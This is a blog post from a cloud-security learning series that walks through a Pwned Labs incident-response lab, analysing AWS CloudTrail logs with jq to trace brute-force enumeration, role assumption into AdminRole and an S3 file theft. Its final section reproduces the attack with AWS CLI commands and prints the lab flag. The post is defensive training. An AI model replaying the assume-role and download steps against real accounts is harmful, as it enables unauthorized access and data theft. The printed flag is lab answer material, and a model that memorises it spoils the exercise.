---
title: '100 Days of Cloud Security - Day 64: PWNED LABS - Breach in the Cloud'
date: '2026-01-13'
author: 'Venkata Pathuri'
excerpt: 'Day 64 of my cloud security journey - PWNED LABS - Breach in the Cloud'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 64: PWNED LABS - Breach in the Cloud

## Overview
Welcome to Day 64 of our cloud security journey! Today, we immerse ourselves in a simulated security incident involving Huge Logistics. As we analyze AWS CloudTrail logs, we will learn how to detect and respond to security breaches in the cloud. This practical experience builds upon our previous lessons on AWS IAM policies and logging, enhancing our skills in real-world incident response.

## Learning Objectives
By the end of this lab, you will master the skills necessary to identify active users in a compromised AWS environment, detect brute-force attacks, analyze lateral movement, and confirm data exfiltration. You'll also gain hands-on experience with AWS CLI commands and learn best practices for securing AWS environments against such threats.

## Deep Dive

### Phase 1: Log Analysis & Initial Discovery

**1.1 Identify Active Users**  
We start by examining CloudTrail logs to pinpoint active users. This is critical in any incident response as it helps us identify potential threat actors.

- **Command:** 
    ```bash
    grep -r userName | sort -u
    ```
- **Output:**  
    The logs reveal an unusual amount of activity from `temp-user`, along with known users like `_devansh`, `ian`, and `policyuser`. Notably, we also see `AdminRole`, which raises a red flag.

Understanding user activity in your AWS account is vital. Regularly review CloudTrail logs to detect any suspicious behavior early.

**1.2 Detect Brute Force Activity**  
Next, we focus on `temp-user` to check for failed login attempts, common indicators of brute-force attacks.

- **Command:** 
    ```bash
    cat *.json | jq -r '
      .Records[] 
      | select(.errorCode != null) 
      | [.eventTime, .userIdentity.userName, .sourceIPAddress, .eventName, .errorCode, .errorMessage, .userAgent] 
      | @tsv'
    ```
- **Findings:**  
    - **User:** `temp-user`
    - **Activity:** A significant number of `Access Denied` errors.
    - **Source IP:** `84.32.71.46`
    - **Tool:** `aws-sdk-go-v2/1.3.2`

These findings indicate that `temp-user` was likely used in a brute-force attack to enumerate permissions. Always monitor failed login attempts and implement account lockout policies to mitigate such attacks.

**1.3 Confirm Successful Reconnaissance**  
Now, we investigate what the attacker accessed successfully.

- **Command:** 
    ```bash
    cat *.json | jq -r '
      .Records[]
      | select(.sourceIPAddress == "84.32.71.46")
      | [.eventTime, .userIdentity.userName, .eventName, .requestParameters]
      | @text'
    ```
- **Key Findings:**  
    The attacker executed reconnaissance commands, such as:
    - `DescribeSubnets`
    - `ListOpenIDConnectProviders`
    - `ListServiceSpecificCredentials`

These actions reveal the attacker's intent to gather information about the AWS environment. Implementing network segmentation and strict IAM policies can help limit such reconnaissance efforts.

### Phase 2: Lateral Movement & Privilege Escalation

**2.1 Correlating the Attack to AdminRole**  
We now investigate the activity of `AdminRole`. We notice that requests are coming from various IPs within the same subnet used by `temp-user`.

- **Command:** 
    ```bash
    cat *.json | jq -r '
      .Records[]
      | select(.userIdentity.sessionContext.sessionIssuer.userName == "AdminRole")
      | [.eventTime, .sourceIPAddress, .eventName, .userIdentity.arn]
      | @tsv'
    ```
- **Output:**  
    ```
    2023-08-26T20:59:54Z    84.32.71.36     GetCallerIdentity
    2023-08-26T21:17:10Z    84.32.71.125    ListObjects
    2023-08-26T21:17:16Z    84.32.71.3      GetObject
    ```

This indicates that the attacker successfully escalated privileges from `temp-user` to `AdminRole`. Regularly review IAM roles and their policies to ensure least privilege access.

**2.2 Verify the Vulnerable Policy**  
To understand how the attacker escalated privileges, we check `temp-user`'s attached policies.

- **Command:** 
    ```bash
    aws iam get-user-policy --user-name temp-user --policy-name test-temp-user
    ```
- **Output (JSON Snippet):**  
    ```json
    "Action": "sts:AssumeRole",
    "Resource": "arn:aws:iam::107513503799:role/AdminRole"
    ```

Here, the policy explicitly allowed `temp-user` to assume the `AdminRole`, highlighting a significant security flaw. Always use IAM Access Analyzer to evaluate permissions and policies for potential vulnerabilities.

### Phase 3: Confirming Data Exfiltration

**3.1 Identify Stolen Data**  
Finally, we track what actions were taken after `temp-user` assumed the `AdminRole`.

- **Command:** 
    ```bash
    cat *.json | jq -r '
      .Records[]
      | select(.eventName == "GetObject")
      | select(.userIdentity.sessionContext.sessionIssuer.userName == "AdminRole")
      | [.eventTime, .requestParameters.bucketName, .requestParameters.key]
      | @tsv'
    ```
- **Output:**  
    ```
    2023-08-26T21:17:16Z    emergency-data-recovery    emergency.txt
    ```

The attacker exfiltrated a sensitive file named `emergency.txt`. Implementing logging and monitoring on sensitive buckets can help catch unauthorized access early.

## Hands-On Practice

To finalize the lab, let’s reproduce the attack steps and retrieve the flag.

**4.1 Assume the Role**  
- **Command:**  
    ```bash
    aws sts assume-role --role-arn arn:aws:iam::107513503799:role/AdminRole --role-session-name MySession
    ```

**4.2 Download the Compromised File**  
- **Command:**  
    ```bash
    aws s3 cp s3://emergency-data-recovery/emergency.txt ./emergency.txt --profile AdminRole
    ```

**4.3 Read the Flag**  
- **Command:**  
    ```bash
    cat emergency.txt
    ```

- **Output:**  
    **flag: 3eb222cf55522f0f321f1ed5ed9a3663**

### Key Takeaways
Today, we learned how to analyze CloudTrail logs to identify user activity, detect brute force attacks, and confirm privilege escalation and data exfiltration. These skills are essential for securing AWS environments against potential breaches.

### Real-World Applications
Understanding these concepts not only helps in responding to incidents but also in proactively securing AWS environments. Companies must regularly audit their IAM policies and CloudTrail logs to ensure that their cloud infrastructures remain secure against evolving threats.

---
**Journey Progress:** 64/100 Days Complete 🚀